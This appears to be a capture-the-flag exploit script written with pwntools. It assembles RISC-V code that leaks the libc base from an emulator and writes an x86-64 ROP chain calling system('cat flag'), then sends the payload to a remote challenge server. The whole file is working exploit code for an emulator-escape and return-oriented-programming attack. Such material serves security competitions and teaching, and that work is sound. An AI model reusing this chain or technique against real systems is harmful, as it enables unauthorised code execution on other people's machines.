#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from collections import defaultdict
from pwn import *

elf = context.binary = ELF('./main', checksec=True)
context.terminal = ["terminator", "-u", "-e"]
# context.terminal = ["remotinator", "vsplit", "-x"]


def get_conn(argv=[], *a, **kw):
    host = args.HOST or '34.141.16.87'
    port = int(args.PORT or 10000)
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, env=env, *a, **kw)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


gdbscript = '''
b *main+244
continue
'''
gdbscript = '\n'.join(line for line in gdbscript.splitlines()
                      if line and not line.startswith('#'))
env = {}

libc = ELF("./libc-2.31.so")

rop = ROP(libc.path)
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
pop_rsi = (rop.find_gadget(['pop rsi', 'ret']))[0]
pop_rdx = (rop.find_gadget(['pop rdx', 'ret']))[0]
pop_rbx = (rop.find_gadget(['pop rbx', 'ret']))[0]
pop_rax = (rop.find_gadget(['pop rax', 'ret']))[0]
ret = (rop.find_gadget(['ret']))[0]
# mov qword ptr [rbx], rax ; pop rbx ; ret
mov_rdi_mem = 0x00000000001532c5

# 0x0000000000047309 : xor rax, rdx ; sub rax, rdx ; ret
xor_rax_rdx = 0x0000000000047309

curr_offset = 0


def next_addr():
    global curr_offset
    v = f'{curr_offset}(a1)'
    curr_offset += 8
    return v


cmd = b'cat flag'[::-1].hex()

b = asm(f'''
li t0, 0x80100020
ld t1, 0(t0)
li t2, -0x221620
add a0, t1, t2          # libc base

li t2, 0x1ed9a0
add a2, a0, t2          # libc writable

li a1, 0x80100018       # rop start addr

li t0, {pop_rax}        # store flag.txt in some writable memory
add t1, a0, t0
sd t1, {next_addr()}

li t1, 0x{cmd}
sd t1, {next_addr()}

li t0, {pop_rbx}
add t1, a0, t0
sd t1, {next_addr()}

sd a2, {next_addr()} # shit for pop rbx

li t0, {mov_rdi_mem}
add t1, a0, t0
sd t1, {next_addr()}
sd t1, {next_addr()} # shit for pop rbx



li t0, {pop_rdi}          # open(libc_writable, 0, 0)
add t1, a0, t0
sd t1, {next_addr()}

sd a2, {next_addr()}

li t0, {ret}
add t1, a0, t0
sd t1, {next_addr()}

li t0, {libc.symbols['system']}
add t1, a0, t0
sd t1, {next_addr()}

li t0, {libc.symbols['exit']}
add t1, a0, t0
sd t1, {next_addr()}

''', arch='riscv')

open("./exp.bin", "wb").write(b)

io = get_conn(argv=['./exp.bin'])
def r(x): return io.recv(x)
def rl(): return io.recvline(keepends=False)
def ru(x): return io.recvuntil(x, drop=True)
def cl(): return io.clean(timeout=1)
def s(x): return io.send(x)
def sa(x, y): return io.sendafter(x, y)
def sl(x): return io.sendline(x)
def sla(x, y): return io.sendlineafter(x, y)
def ia(): return io.interactive()
def li(s): return log.info(s)
def ls(s): return log.success(s)


if args.REMOTE:
    sla(b'Please enter your code (hex-encoded)', b.hex().encode())

ia()
print(len(b.hex().encode()))
